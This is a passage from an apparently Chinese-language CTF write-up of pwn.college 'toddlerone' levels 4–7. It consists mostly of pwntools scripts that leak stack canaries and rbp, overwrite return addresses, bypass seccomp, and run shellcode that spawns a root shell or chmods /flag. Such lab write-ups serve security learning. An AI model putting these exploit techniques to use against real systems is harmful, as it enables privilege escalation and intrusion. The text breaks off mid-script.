class="hljs-string">f&quot;canary : <span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>(hex_canary)&#125;</span>&quot;</span>)<br><span class="hljs-comment"># 第二次泄露 第一次 rbp 的地址，从而构造 ret</span><br>interval += <span class="hljs-number">7</span> <span class="hljs-comment"># 补上canary，溢出到rbp之前的位置</span><br>r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval))<br>payload = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;B&#x27;</span>* (interval - <span class="hljs-number">6</span>)   <span class="hljs-comment"># 这里直接把canary也覆盖了，因为不覆盖会有&#x27;\x00&#x27;截断</span><br>r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>r.recvuntil(<span class="hljs-string">&quot;You said: &quot;</span>)<br>text_of_rbp = r.recvuntil(<span class="hljs-string">&quot;Backdoor&quot;</span>)<br>rbp_byte = text_of_rbp[interval:interval+<span class="hljs-number">6</span>]<span class="hljs-comment"># 获得rbp的值</span><br>hex_rbp = [<span class="hljs-built_in">hex</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(rbp_byte)]<br>log.info(<span class="hljs-string">f&quot;address of rbp : <span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>(hex_rbp)&#125;</span>&quot;</span>)<br>rbp_int = struct.unpack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, (rbp_byte + <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>))[<span class="hljs-number">0</span>]<br>rbp_int -= ((<span class="hljs-number">0xA0</span> + <span class="hljs-number">0x10</span>) * <span class="hljs-number">2</span> + interval)<span class="hljs-comment"># 修正 ret</span><br>ret = struct.pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, rbp_int)<br><br><span class="hljs-comment"># 第三次执行 shellcode</span><br>shell_code = asm(shellcode,arch=<span class="hljs-string">&quot;amd64&quot;</span>)<br>hex_shell_code = [<span class="hljs-built_in">hex</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(shell_code)]<br>log.info(<span class="hljs-string">f&quot;shellcode : <span class="hljs-subst">&#123;hex_shell_code&#125;</span>&quot;</span>)<br>log.info(<span class="hljs-string">f&quot;len of shellcode is: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(shell_code)&#125;</span>&quot;</span>)<br>interval += <span class="hljs-number">16</span><span class="hljs-comment"># 补上rbp和ret，需要溢出到return之后的位置</span><br>r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval)) <br>num = <span class="hljs-number">0x9CB0C1F346468855</span><br>num_addr = <span class="hljs-number">0x18</span><span class="hljs-comment"># 数值距离rbp的偏移</span><br>payload = shell_code + <span class="hljs-string">b&#x27;C&#x27;</span> * (interval - <span class="hljs-number">16</span> - num_addr - <span class="hljs-built_in">len</span>(shell_code)) + p64(num) + <span class="hljs-string">b&#x27;D&#x27;</span>*(num_addr - <span class="hljs-number">0x10</span>) + canary + <span class="hljs-string">b&#x27;E&#x27;</span>*<span class="hljs-number">0x8</span> + ret<span class="hljs-comment"># num_addr-0x10是因为num离rbp距离为0x18，然后num和canary各占据0x8的大小</span><br>r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="level-5-3"><a class="markdownIt-Anchor" href="#level-5-3"></a> level 5</h2><blockquote><p>初始化有了改变，注意多出来一个 push rbx，所以偏移需要相应更改</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> struct<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/toddlerone_level[0-9].[0-9]&quot;</span>)<br>r = process(binary_paths)<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rax, 0x69           # setuid,设置特权,单纯使用shell不能提权</span><br><span class="hljs-string">    mov rdi, 0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 59             # execve</span><br><span class="hljs-string">    lea rdi, [rip+binsh]</span><br><span class="hljs-string">    mov rsi, 0</span><br><span class="hljs-string">    mov rdx, 0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">binsh:</span><br><span class="hljs-string">    .string &quot;/bin/sh&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-comment"># 采用这个shellcode是为了让长度小于0x40 - 24</span><br><span class="hljs-comment"># 第一次泄露 canary 的值</span><br>interval = <span class="hljs-number">0x70</span> - <span class="hljs-number">8</span> + <span class="hljs-number">1</span> - <span class="hljs-number">16</span><span class="hljs-comment"># 减去canary的长度，然后需要覆盖最后一个&#x27;\x00&#x27;而+1，溢出到canary之前的位置</span><br>r = process(binary_paths)<br>r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval))<br>payload = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span>* (interval - <span class="hljs-number">6</span>)  <span class="hljs-comment"># 满足buffer的要求</span><br>r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>r.recvuntil(<span class="hljs-string">&quot;You said: &quot;</span>)<br>text_of_canary = r.recvuntil(<span class="hljs-string">&quot;Backdoor&quot;</span>)<br>canary = <span class="hljs-string">b&#x27;\x00&#x27;</span> + text_of_canary[interval:interval+<span class="hljs-number">7</span>]<span class="hljs-comment"># 获得canary的值</span><br>hex_canary = [<span class="hljs-built_in">hex</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(canary)]<br>log.info(<span class="hljs-string">f&quot;canary : <span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>(hex_canary)&#125;</span>&quot;</span>)<br><span class="hljs-comment"># 第二次泄露 第一次 rbp 的地址，从而构造 ret</span><br>interval += (<span class="hljs-number">7</span> + <span class="hljs-number">16</span>) <span class="hljs-comment"># 补上canary，溢出到rbp之前的位置</span><br>r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval))<br>payload = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;B&#x27;</span>* (interval - <span class="hljs-number">6</span>)   <span class="hljs-comment"># 这里直接把canary也覆盖了，因为不覆盖会有&#x27;\x00&#x27;截断</span><br>r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>r.recvuntil(<span class="hljs-string">&quot;You said: &quot;</span>)<br>text_of_rbp = r.recvuntil(<span class="hljs-string">&quot;Backdoor&quot;</span>)<br>rbp_byte = text_of_rbp[interval:interval+<span class="hljs-number">6</span>]<span class="hljs-comment"># 获得rbp的值</span><br>hex_rbp = [<span class="hljs-built_in">hex</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(rbp_byte)]<br>log.info(<span class="hljs-string">f&quot;address of rbp : <span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>(hex_rbp)&#125;</span>&quot;</span>)<br>rbp_int = struct.unpack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, (rbp_byte + <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>))[<span class="hljs-number">0</span>]<br>rbp_int -= ((<span class="hljs-number">0xc0</span> + <span class="hljs-number">0x10</span>) * <span class="hljs-number">2</span> + interval)<span class="hljs-comment"># 修正 ret，本来 sub rsp 0xb8，这里有一个push，所以加上 0x8</span><br>ret = struct.pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, rbp_int)<br><br><span class="hljs-comment"># 第三次执行 shellcode</span><br>shell_code = asm(shellcode,arch=<span class="hljs-string">&quot;amd64&quot;</span>)<br>hex_shell_code = [<span class="hljs-built_in">hex</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(shell_code)]<br>log.info(<span class="hljs-string">f&quot;shellcode : <span class="hljs-subst">&#123;hex_shell_code&#125;</span>&quot;</span>)<br>log.info(<span class="hljs-string">f&quot;len of shellcode is: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(shell_code)&#125;</span>&quot;</span>)<br>interval += <span class="hljs-number">16</span><span class="hljs-comment"># 补上rbp和ret，需要溢出到return之后的位置</span><br>r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval)) <br>num = <span class="hljs-number">0xE4AD9CCA285A76D6</span><br>num_addr = <span class="hljs-number">0x30</span><br>payload = shell_code + <span class="hljs-string">b&#x27;C&#x27;</span> * (interval - <span class="hljs-number">16</span> - num_addr - <span class="hljs-built_in">len</span>(shell_code)) + p64(num) + <span class="hljs-string">b&#x27;D&#x27;</span>*(num_addr - <span class="hljs-number">0x20</span>) + canary + <span class="hljs-string">b&#x27;E&#x27;</span>*<span class="hljs-number">0x18</span> + ret<span class="hljs-comment"># 这里没有搞懂，为什么只有一个push rbx，但是栈上面多出来一个0x8的空间，所以 -0x20 和 * 0x18 都是为了这个服务的，.1就没这个问题了，注意具体问题具体分析</span><br>r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="level-6"><a class="markdownIt-Anchor" href="#level-6"></a> level 6</h2><blockquote><p>这里我的失误都是对于cannary在最后的payload的偏移出错，这里就需要学会在特定位置动态调试，这里6.1没有符号，所以建议 gdb.debug(binary_paths[0],“break seccomp_load”) 对系统api进行断点，然后可以看到最后的stack来判断自己的payload是否正确</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs assembly">// 看一下栈<br>// 第一次调用challenge的栈<br>| 0x00007ffd906670d8 (rsp+0x0078) | 00 6c a8 2f 97 d6 69 68 | 0x6869d6972fa86c00 | canary<br>| 0x00007ffd906670e0 (rsp+0x0080) | 40 02 49 5b b0 55 00 00 | 0x000055b05b490240 |<br>| 0x00007ffd906670e8 (rsp+0x0088) | 10 12 49 5b b0 55 00 00 | 0x000055b05b491210 |<br>| 0x00007ffd906670f0 (rsp+0x0090) | 30 81 66 90 fd 7f 00 00 | 0x00007ffd90668130 |rbp<br>| 0x00007ffd906670f8 (rsp+0x0098) | ed 11 49 5b b0 55 00 00 | 0x000055b05b4911ed |ret<br>+---------------------------------+-------------------------+--------------------+<br>input = 0x7ffd906670b0length=0x40=0xf0-0xb0，但是真实大小为0x40-0x18=0x28，40个字节<br><br>// 第一次从challenge到challenge的栈<br>| 0x00007ffd90667038 (rsp+0x0078) | 00 6c a8 2f 97 d6 69 68 | 0x6869d6972fa86c00 |<br>| 0x00007ffd90667040 (rsp+0x0080) | 40 02 49 5b b0 55 00 00 | 0x000055b05b490240 |<br>| 0x00007ffd90667048 (rsp+0x0088) | 10 12 49 5b b0 55 00 00 | 0x000055b05b491210 |<br>| 0x00007ffd90667050 (rsp+0x0090) | f0 70 66 90 fd 7f 00 00 | 0x00007ffd906670f0 |<br>| 0x00007ffd90667058 (rsp+0x0098) | b7 0f 49 5b b0 55 00 00 | 0x000055b05b490fb7 |<br>+---------------------------------+-------------------------+--------------------+<br>input = 0x7ffd90667010<br><br>// 第二次从challenge到challenge的栈<br>| 0x00007ffd90666f98 (rsp+0x0078) | 00 6c a8 2f 97 d6 69 68 | 0x6869d6972fa86c00 |<br>| 0x00007ffd90666fa0 (rsp+0x0080) | 40 02 49 5b b0 55 00 00 | 0x000055b05b490240 |<br>| 0x00007ffd90666fa8 (rsp+0x0088) | 10 12 49 5b b0 55 00 00 | 0x000055b05b491210 |<br>| 0x00007ffd90666fb0 (rsp+0x0090) | 50 70 66 90 fd 7f 00 00 | 0x00007ffd90667050 |<br>| 0x00007ffd90666fb8 (rsp+0x0098) | b7 0f 49 5b b0 55 00 00 | 0x000055b05b490fb7 |<br>+---------------------------------+-------------------------+--------------------+<br>input = 0x7ffd90666f70<br></code></pre></td></tr></table></figure><p>​这里主要就是看 cannary 的地址和 seccomp。对于cannary，看 <code>fs:28h</code> 传入栈的地址得到 cannary 的位置，这里需要注意 <code>push rbx</code> 形成了干扰(这里感觉存在脏东西，不然一个 push rbx 不会形成栈上 rsp+0x80 和 rsp+0x88 这两个地方的数据)，同时由于cannary 和 buf 之间的间隔很小，所以需要选择适当的shellcode。</p><p>​然后对于 seccomp，这里就是对于 <code>seccomp_rule_add(ctx, 0x7FFF0000, *((unsigned int *)v16 + i), 0)</code> 的理解， 0x7fff0000 表示设置允许的系统调用规则，后面的 v16+i 是栈上的参数，在buf的下面，也就是让你通过溢出覆盖栈上的数据选择可以使用的系统调用，这里根据使用的shellcode选择了 chmod 的系统调用，所以 v16+0 就是 0x5a(chmod的系统调用号)。这里它允许两个系统调用，其实一个就够了，另外一个应该设置为 0x1(write)，不然最后的 Goodbye! 不能打印出来，因为它使用的是 puts，底层需要使用 write 进行输出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> struct<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/toddlerone_level[0-9].[0-9]&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br>r = process(binary_paths)<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    push 0x66</span><br><span class="hljs-string">    mov rdi,rsp</span><br><span class="hljs-string">    push 4</span><br><span class="hljs-string">    pop rsi</span><br><span class="hljs-string">    mov al,0x5a</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-comment"># 采用这个shellcode是为了让长度小于0x40 - 0x18,这里需要先链接 ln -s /flag f</span><br><br><span class="hljs-comment">#### 第一次泄露 canary 的值 ####</span><br><span class="hljs-comment"># canary(fs:28h)被赋值到 rbp - 0x18 位置，所以cannary处于buf的起始位置0x40 - 0x18的位置，+1 覆盖 \x00 溢出</span><br>interval = <span class="hljs-number">0x40</span> - <span class="hljs-number">0x18</span> + <span class="hljs-number">1</span><br>r.sendlineafter(<span class="hljs-string">b&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval).encode())<br>payload = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span>* (interval - <span class="hljs-number">6</span>)  <span class="hljs-comment"># 满足buf再次调用challenge的条件</span><br>r.sendafter(<span class="hljs-string">b&quot;bytes)!\n&quot;</span>, payload)<br>r.recvuntil(<span class="hljs-string">b&quot;You said: &quot;</span>)<br>text_of_canary = r.recvuntil(<span class="hljs-string">b&quot;Backdoor&quot;</span>)<br>canary = <span class="hljs-string">b&#x27;\x00&#x27;</span> + text_of_canary[interval:interval+<span class="hljs-number">7</span>]<span class="hljs-comment"># 获得canary的值</span><br>hex_canary = [<span class="hljs-built_in">hex</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(canary)]<br>success(<span class="hljs-string">f&quot;canary : <span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>(hex_canary)&#125;</span>&quot;</span>)<br><br><span class="hljs-comment">#### 第二次泄露 根据第一次challenge到challenge的 rbp 的地址，从而构造 ret ####</span><br>interval += <span class="hljs-number">7</span> + <span class="hljs-number">8</span> + <span class="hljs-number">8</span>  <span class="hljs-comment"># 补上canary和最开始push的rbx(rbx存在两个8字节的脏数据)，使之溢出到rbp之前的位置</span><br>r.sendlineafter(<span class="hljs-string">b&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval).encode())<br>payload = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;B&#x27;</span>* (interval - <span class="hljs-number">6</span>)   <span class="hljs-comment"># 这里直接把canary也覆盖了，因为不覆盖会有&#x27;\x00&#x27;截断</span><br>r.sendafter(<span class="hljs-string">b&quot;bytes)!\n&quot;</span>, payload)<br>r.recvuntil(<span class="hljs-string">b&quot;You said: &quot;</span>)<br>text_of_rbp = r.recvuntil(<span class="hljs-string">b&quot;Backdoor&quot;</span>)<br>rbp_byte = text_of_rbp[interval:interval+<span class="hljs-number">6</span>]<span class="hljs-comment"># 获得rbp的值</span><br>hex_rbp = [<span class="hljs-built_in">hex</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(rbp_byte)]<br>success(<span class="hljs-string">f&quot;address of rbp : <span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>(hex_rbp)&#125;</span>&quot;</span>)<br>rbp_int = struct.unpack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, (rbp_byte + <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>))[<span class="hljs-number">0</span>]<br><span class="hljs-comment"># 修正 ret，这里是根据第一次challenge到challenge泄露的 rbp 地址计算出第二次从challenge到challenge的input地址</span><br><span class="hljs-comment"># 0x88 是每次进入challenge的 sub rsp, 88h 产生的影响，然后0x10是push rbx的16字节脏数据，0x8是cannary，然后*2就是两次进入challenge的偏移，最后得到了第二次的rbp地址，然后根据buf与rbp的偏移 interval计算出input的地址</span><br><span class="hljs-comment"># 根据 6.1 的exp来看，上面理解有误，这里0x10指代 ret和old_rbp 的大小，然后0x8指代 push rbx 的大小。对于rsp和rbp的偏移，push rbx 就是0x8大小，而这里我说有16字节的脏数据，应该是后面的程序对于栈上数据进行了更改，造成了这样的一个现象，同时那个多余的0x8字节只是对于栈上cannary和buf的地址偏移计算造成影响，对于rbp的计算无影响。这里*2就是总共有三个challenge连在一起，由第一个rbp得到第三个的buf地址。</span><br>rbp_int -= ((<span class="hljs-number">0x88</span> + <span class="hljs-number">0x10</span> + <span class="hljs-number">0x8</span>) * <span class="hljs-number">2</span> + interval)<br>ret = struct.pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, rbp_int)<br>hex_ret = [<span class="hljs-built_in">hex</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(ret)]<br>success(<span class="hljs-string">f&quot;address of ret : <span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>(hex_ret)&#125;</span>&quot;</span> )<br><br><span class="hljs-comment">#### 第三次执行 shellcode ####</span><br>shell_code = asm(shellcode,arch=<span class="hljs-string">&quot;amd64&quot;</span>).ljust(<span class="hljs-number">24</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<span class="hljs-comment"># 这里补全了buf的内容，以便后面的计算</span><br>hex_shell_code = [<span class="hljs-built_in">hex</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(shell_code)]<br>success(<span class="hljs-string">f&quot;shellcode : <span class="hljs-subst">&#123;hex_shell_code&#125;</span>&quot;</span>)<br>success(<span class="hljs-string">f&quot;len of shellcode is: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(shell_code)&#125;</span>&quot;</span>)<br>interval += <span class="hljs-number">16</span><span class="hljs-comment"># 补上rbp和ret，需要溢出到return之后的位置</span><br>r.sendlineafter(<span class="hljs-string">b&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval).encode()) <br><span class="hljs-comment"># buf(24)+chmod(8)+write(8)+b&#x27;C&#x27;(8)+cannary+b&#x27;D&#x27;(24)+ret(8)</span><br>payload = shell_code + p32(<span class="hljs-number">0x5a</span>) + p32(<span class="hljs-number">0x1</span>) + <span class="hljs-string">b&#x27;C&#x27;</span> * (<span class="hljs-number">0x28</span> - <span class="hljs-number">0x8</span> - <span class="hljs-number">0x8</span> - <span class="hljs-built_in">len</span>(shell_code))  + canary + <span class="hljs-string">b&#x27;D&#x27;</span>*(interval - <span class="hljs-number">0x8</span> - <span class="hljs-number">0x30</span>) + ret<br>r.sendafter(<span class="hljs-string">b&quot;bytes)!\n&quot;</span>, payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="level-7-3"><a class="markdownIt-Anchor" href="#level-7-3"></a> level 7</h2><blockquote><p>这里存在vm虚拟机，同时禁用了open，所以通过查看打印的栈信息，通过read_memory读取输入信息，溢出覆盖返回地址，然后爆破得到相应的偏移，成功执行payload</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> struct<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/toddlerone_level[0-9].[0-9]&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><span class="hljs-comment"># 查看二进制代码获取的规则</span><br><span class="hljs-comment"># arg2 arg1 op  -&gt; rbp+var+2 rbp+var+1 rbp+var 这里最好动态调试，看汇编看不明白</span><br><span class="hljs-comment"># imm 0x1 add 0x8 stk 0x40 stm 0x4 ldm 0x10 cmp 0x20 jmp 0x2 sys 0x80</span><br><span class="hljs-comment"># a 0x40 b 0x1 c 0x2 d 0x10 s 0x20 i 0x4 f 0x8 </span><br><br><span class="hljs-comment"># shellcode，就是open f 和 sys_sendfile</span><br>shellcode_origin = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    push 0x66</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    mov rsi, 0</span><br><span class="hljs-string">    mov al, 2</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    mov rsi, rax</span><br><span class="hljs-string">    mov rdx, 0</span><br><span class="hljs-string">    mov rcx, 0x1000</span><br><span class="hljs-string">    mov ax, 40</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># 根据vm的规则设定相应的vm_op，然后通过get_ins直接获取相应的二进制数</span><br>ID = [<span class="hljs-string">b&#x27;\x01&#x27;</span>, <span class="hljs-string">b&#x27;\x02&#x27;</span>, <span class="hljs-string">b&#x27;\x04&#x27;</span>, <span class="hljs-string">b&#x27;\x08&#x27;</span>, <span class="hljs-string">b&#x27;\x10&#x27;</span>, <span class="hljs-string">b&#x27;\x20&#x27;</span>, <span class="hljs-string">b&#x27;\x40&#x27;</span>, <span class="hljs-string">b&#x27;\x80&#x27;</span>]<br>vm_op = &#123;<br>    <span class="hljs-string">&#x27;IMM&#x27;</span>: ID[<span class="hljs-number">0</span>],<br>    <span class="hljs-string">&#x27;ADD&#x27;</span>: ID[<span class="hljs-number">3</span>],<br>    <span class="hljs-string">&#x27;STK&#x27;</span>: ID[<span class="hljs-number">6</span>],<br>    <span class="hljs-string">&#x27;STM&#x27;</span>: ID[<span class="hljs-number">2</span>],<br>    <span class="hljs-string">&#x27;LDM&#x27;</span>: ID[<span class="hljs-number">4</span>],<br>    <span class="hljs-string">&#x27;CMP&#x27;</span>: ID[<span class="hljs-number">5</span>],<br>    <span class="hljs-string">&#x27;JMP&#x27;</span>: ID[<span class="hljs-number">1</span>],<br>    <span class="hljs-string">&#x27;SYS&#x27;</span>: ID[<span 